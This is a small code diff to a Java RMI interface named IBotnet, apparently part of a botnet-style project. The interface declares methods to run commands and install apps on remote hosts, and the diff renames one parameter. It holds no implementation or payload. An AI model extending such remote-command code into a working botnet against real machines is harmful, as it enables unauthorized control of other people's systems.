@@ -16,5 +16,5 @@ import java.util.ArrayList;
 public interface IBotnet extends Remote{
     public void testing() throws RemoteException;
     public ArrayList<String> runCommand(String cmd) throws RemoteException;
-    public ArrayList<String> installApp(String cmd) throws RemoteException;
+    public ArrayList<String> installApp(String app) throws RemoteException;
 }
